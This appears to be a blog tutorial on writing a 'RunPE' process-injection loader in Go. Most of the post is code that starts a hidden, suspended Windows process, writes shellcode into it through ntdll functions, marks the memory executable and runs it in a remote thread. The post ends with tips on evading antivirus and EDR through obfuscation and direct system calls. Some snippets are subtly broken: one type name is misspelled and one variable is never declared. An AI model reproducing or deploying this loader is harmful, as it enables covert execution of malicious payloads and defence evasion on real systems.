---
title: Coding RUNPE loader in go lang
description: using go lang to implement runpe
date: 2023-05-29 00:00:00+0000

slug: go-run-pe
image: cover.jpg
categories:
    - Malware
tags:
    - Malware
---

Hello , Friends 

In todays blog I'm going to explain implementing RUNPE in go lang.


## So whats going to be achived?

By the end of this blog you should have a go lang script that is capable of spawning another process in a suspended state and then allocating our malicious shellcode onto the suspended applications stack  spawning a remote thread on that process to execute our payload.


## How

### Setting up imports

In order to achive runpe we need to import some go packages that will be used to achive runpe.


``` golang
import (
	"unsafe"
	"syscall"
	"golang.org/x/sys/windows"
)

```
#### unsafe

This is used to create pointers to memory adresses

#### syscall
This package is used to create the suspended process aswell as giving us definitions for items such as handles onto the process.


#### windows

The windows package is imported so that we are able to access windows API calls located in ntdll.dll


### Creating the suspended process

In order to create a suspended process we are going to use the create process function in go's syscall package. This allows us to create a process and asign dwCreationFlags to the application.

the syscall package is directly calling createProcessW from processthreadapi.h 

```cpp
BOOL CreateProcessW(
  [in, optional]      LPCWSTR               lpApplicationName,
  [in, out, optional] LPWSTR                lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCWSTR               lpCurrentDirectory,
  [in]                LPSTARTUPINFOW        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);

```

Okay so lets code the function that calls this windows API

First of all we are going to define a function that returns the type of syscall.ProcessInfomation. doing this will allow to store the response of `lpProcessInformation` and handle it in go to get a handle on our process that we create


```golang

func createprocess() *syscall.ProcessInfomation{



}

```

The next step is to setup so varibles for the create process call these will be used for lpStartupInfo and lpProcessInformation respectivley.

``` golang 
var si syscall.StartupInfo
var pi syscall.ProcessInformation

```

After setting up those varibles we can create our varible for storing the path to the application we are going to inject into. This can be achived by taking a string and converting it to a UTF16Ptr this is done so that the windos API can understand the string.

``` golang
path := "C:\\Windows\\System32\\at.exe"
commandLine, err := syscall.UTF16PtrFromString(path)

if err != nil {
    panic(err)
}

```

Having defined all our varibles we cab now call create process. We can do this like

``` golang

err = syscall.CreateProcess(
    nil,
    commandLine,
    nil,
    nil,
    false,
    windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW,
    nil,
    nil,
    &si,
    &pi)

if err != nil {
    panic(err)
}

```

This means our function should now look like this

``` golang

func createprocess() *syscall.ProcessInfomation{
    
        var si syscall.StartupInfo
	var pi syscall.ProcessInformation
        path := "C:\\Windows\\System32\\at.exe"

	commandLine, err := syscall.UTF16PtrFromString(path)

	if err != nil {
		panic(err)
	}

	err = syscall.CreateProcess(
		nil,
		commandLine,
		nil,
		nil,
		false,
		windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW,
		nil,
		nil,
		&si,
		&pi)

	if err != nil {
		panic(err)
	}

	return &pi


}
```

### Writing shellcode to process

Now that we have created the function to spawn a suspended process we can move onto creating a function to write memory to our newly created process.
In order to achive this we will be using the following items

#### ntdll.dll

ntdll.dll has all of the windows functions we will be calling. It is worth knowing importing it as shown below will be 100% detected by any compitant EDR solution.

#### NtAllocateVirtualMemory

NtAllocateVirtualMemory allows the allocation of memory on a given process when supplied a handle


#### NtWriteVirtualMemory

NtWriteVirtualMemory allows the writing of memory to another process with a handle 

#### NtProtectVirtualMemory

NtProtectVirtualMemory allows the changing the page permissions of processes memory 

#### NtCreateThreadEx
NtCreateThreadEx allows the creation of remote threads on seperate process


Okay now we know what we are calling and why we are calling these functions lets get into writing the go function writing and executing the shellcode.

Initially we need to create the function and define our system calls this can be done like this :

``` golang
func runpe(shellcode []byte) {
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntAllocateVirtualMemory := ntdll.NewProc("NtAllocateVirtualMemory")
	ntProtectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")
	ntWriteVirtualMemory := ntdll.NewProc("NtWriteVirtualMemory")
	ntCreateThreadEx := ntdll.NewProc("NtCreateThreadEx")

    pi := createprocess()

    var lpBaseAddress uintptr
	size := len(shellcode)

}

```

Having defined the functions we are going to use we can begin to call the system calls we defined above


First we'll call ntAllocateVirtualMemory using pi.Process as the handle on the process to create a space in the applications process to write our shellcode

``` golang
ntAllocateVirtualMemory.Call(uintptr(pi.Process), uintptr(unsafe.Pointer(&lpBaseAddress)), 0, uintptr(unsafe.Pointer(&size)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

```
Next we'll write the shellcode to the allocated space this is done by writing to the process at lpBaseAddress this is the begining of the allocated space on the stack from above.

```golang 
ntWriteVirtualMemory.Call(uintptr(pi.Process), lpBaseAddress, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(size), 0)
```

Having allocated and wrote the memory to the process the next step is to change the page permissions to allow the execution of code flow

``` golang
ntProtectVirtualMemory.Call(uintptr(pi.Process), uintptr(unsafe.Pointer(&lpBaseAddress)), uintptr(unsafe.Pointer(&size)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
```

Finnaly having allocated , wrote and changed the permission on the stack we can now create a remote thread on the suspended process and call execution of our code by pointing the thread entry point to lpBaseAddress

```golang
ntCreateThreadEx.Call(uintptr(unsafe.Pointer(&pi.Thread)), windows.GENERIC_EXECUTE, 0, uintptr(pi.Process), lpBaseAddress, lpBaseAddress, 0, 0, 0, 0, 0)
```
### PWN

Now that the code for spawning a process and writing to it are written we can call them like this 


```golang
func main(){
    x := []byte{ 0x90 , 0x90}
    runpe(x)
}
```


### Now what?

In the applications current state it should be reletivly detactable by most consumer anti viruses moving on from here in attempts to evade AV's we could look at obstructification of the code or attempting to proform direct system calls to bypass user land hooks